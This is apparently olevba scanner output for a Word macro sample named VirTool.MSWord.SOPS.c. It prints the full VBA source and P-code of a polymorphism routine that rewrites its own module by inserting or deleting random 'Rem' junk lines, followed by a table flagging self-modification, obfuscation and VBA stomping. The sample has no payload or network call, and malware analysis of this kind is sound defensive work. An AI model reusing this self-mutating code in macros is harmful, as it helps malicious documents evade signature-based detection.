olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./VirTool.MSWord.SOPS.c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./VirTool.MSWord.SOPS.c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO SOPS.bas 
in file: ./VirTool.MSWord.SOPS.c - OLE stream: 'Macros/VBA/SOPS'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub SomeOtherPolymorphicSystem()
On Error Resume Next

Randomize

ActiveLines = Application.VBE.ActiveVBProject.VBComponents("SOPS").CodeModule.CountOfLines

If ActiveLines > 65 Then
    
    With Application.VBE.ActiveVBProject.VBComponents("SOPS").CodeModule
    
        For TheLine = 1 To .CountOfLines
            If Left(.Lines(TheLine, 1), 3) = "Rem" Then .DeleteLines TheLine
        Next TheLine
    
    End With
    
Else
    
    With Application.VBE.ActiveVBProject.VBComponents("SOPS").CodeModule
    
        PolySize = Int(Rnd * 10)
    
        For PolyMorphic = 1 To PolySize
            
            PolyString = ""
            PolyLines = .CountOfLines
            
            RndLine = Int(Rnd * PolyLines) + 1
            StringSize = Int(Rnd * 39) + 1
            
                For SomeString = 1 To StringSize
                    PolyString = PolyString & Chr(65 + Int(Rnd * 22)) & Chr(122 - Int(Rnd * 22))
                Next SomeString
            
            .InsertLines RndLine, "Rem " & PolyString
        
        Next PolyMorphic

    End With

End If

End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./VirTool.MSWord.SOPS.c
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1351 bytes
' Macros/VBA/SOPS - 15989 bytes
' Line #0:
' 	FuncDefn (Sub SomeOtherPolymorphicSystem())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' Line #3:
' 	ArgsCall Read 0x0000 
' Line #4:
' Line #5:
' 	LitStr 0x0004 "SOPS"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St ActiveLines 
' Line #6:
' Line #7:
' 	Ld ActiveLines 
' 	LitDI2 0x0041 
' 	Gt 
' 	IfBlock 
' Line #8:
' Line #9:
' 	StartWithExpr 
' 	LitStr 0x0004 "SOPS"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #10:
' Line #11:
' 	StartForVariable 
' 	Ld TheLine 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	MemLdWith CountOfLines 
' 	For 
' Line #12:
' 	Ld TheLine 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	LitDI2 0x0003 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0003 "Rem"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld TheLine 
' 	ArgsMemCallWith DeleteLines 0x0001 
' 	EndIf 
' Line #13:
' 	StartForVariable 
' 	Ld TheLine 
' 	EndForVariable 
' 	NextVar 
' Line #14:
' Line #15:
' 	EndWith 
' Line #16:
' Line #17:
' 	ElseBlock 
' Line #18:
' Line #19:
' 	StartWithExpr 
' 	LitStr 0x0004 "SOPS"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #20:
' Line #21:
' 	Ld Rnd 
' 	LitDI2 0x000A 
' 	Mul 
' 	FnInt 
' 	St PolySize 
' Line #22:
' Line #23:
' 	StartForVariable 
' 	Ld PolyMorphic 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld PolySize 
' 	For 
' Line #24:
' Line #25:
' 	LitStr 0x0000 ""
' 	St PolyString 
' Line #26:
' 	MemLdWith CountOfLines 
' 	St PolyLines 
' Line #27:
' Line #28:
' 	Ld Rnd 
' 	Ld PolyLines 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St RndLine 
' Line #29:
' 	Ld Rnd 
' 	LitDI2 0x0027 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St StringSize 
' Line #30:
' Line #31:
' 	StartForVariable 
' 	Ld SomeString 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld StringSize 
' 	For 
' Line #32:
' 	Ld PolyString 
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x007A 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St PolyString 
' Line #33:
' 	StartForVariable 
' 	Ld SomeString 
' 	EndForVariable 
' 	NextVar 
' Line #34:
' Line #35:
' 	Ld RndLine 
' 	LitStr 0x0004 "Rem "
' 	Ld PolyString 
' 	Concat 
' 	ArgsMemCallWith InsertLines 0x0002 
' Line #36:
' Line #37:
' 	StartForVariable 
' 	Ld PolyMorphic 
' 	EndForVariable 
' 	NextVar 
' Line #38:
' Line #39:
' 	EndWith 
' Line #40:
' Line #41:
' 	EndIfBlock 
' Line #42:
' Line #43:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

